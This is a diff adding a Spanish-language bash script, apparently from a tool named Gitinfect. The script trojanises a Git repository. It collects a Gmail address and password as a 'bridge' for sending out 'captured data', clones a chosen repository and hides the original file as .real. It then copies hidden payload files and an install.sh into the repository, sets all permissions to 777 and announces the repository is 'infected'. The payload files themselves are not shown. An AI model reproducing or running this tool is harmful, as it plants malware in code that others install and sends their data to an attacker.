@@ -1,0 +1,51 @@
+# Creando un puente via gmail
+bash .banner
+echo "Introduce un gmail creado para enviar los datos capturados:"
+read input5
+echo "$input5" |& tee .clone/.gm
+bash .banner
+echo "Introduce la contraseña:"
+read input6
+echo "$input6" |& tee .clone/.p
+# Introduccion del gmail al mini payload
+bash .banner
+echo "Introduce tu gmail:"
+read input
+echo "$input" |& tee .clone/.gm1
+# Descarga de la conacion
+bash .banner
+echo "Introduce el enlace del repositorio que deseas infectar:"
+read input1
+git clone $input1
+# Nombre de la clonacion
+bash .banner
+echo "Introduce el nombre del repositorio que acabas de clonar:"
+echo ""
+ls
+echo ""
+read input2
+bash .banner
+# Nombre de los archivos que deseamos infectar
+echo "Introduce el nombre del archivo que deseas infectar:"
+echo ""
+ls $input2/*.*
+echo ""
+read input3
+# Creando los ficheros maliciosos
+mv $input2/$input3 $input2/.real
+cp .clone/.gm -r $input2/
+cp .clone/.gm1 -r $input2/
+cp .clone/.p -r $input2/
+cp .clone/.conf -r $input2/
+cp .clone/.install -r $input2/
+cp .clone/.ia -r $input2/
+cp .clone/.ia1 -r $input2/
+cp .clone/.help -r $input2/
+cp .clone/.conf2 -r $input2/
+cp .clone/install.sh $input2/
+chmod 777 $input2/*
+# Mensaje de despedida
+bash .banner
+echo "Tu repositorio ha sido infectado correctamente!!!"
+read input4
+bash Gitinfect.sh
